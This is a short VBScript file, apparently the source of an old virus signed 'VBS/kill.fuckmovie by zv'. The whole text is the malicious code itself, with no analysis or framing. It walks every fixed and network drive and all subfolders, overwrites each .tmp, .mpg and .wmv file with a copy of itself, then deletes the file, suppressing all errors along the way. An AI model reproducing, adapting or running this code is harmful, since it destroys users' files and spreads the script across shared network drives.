' VBS/kill.fuckmovie by zv, 4/23/2006
On Error Resume Next
Set kill = CreateObject("Scripting.FileSystemObject")
Set fso = CreateObject("WScript.Shell")
E1()
Sub E1()
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
For Each SeekNetCopyDrives In a.Drives
If SeekNetCopyDrives.DriveType = 2 _
Or SeekNetCopyDrives.DriveType = 3 Then
E3 (SeekNetCopyDrives.Path & "\")
End If
Next
End Sub
Sub E2(FileTarget)
On Error Resume Next
Set otf = a.GetFile(WScript.ScriptFullName)
ra = otf.ReadAll
otf.Close
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.Files
FileExt = LCase(a.GetExtensionName(n.Path))
If FileExt = "tmp" Or FileExt = "mpg" Or FileExt = "wmv" Then
kill.CopyFile WScript.ScriptFullName, n.Path & ""
kill.DeleteFile (n.Path)
End If
Next
End Sub
Sub E3(FileTarget)
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.SubFolders
E2 (n.Path)
E3 (n.Path)
Next
End Sub

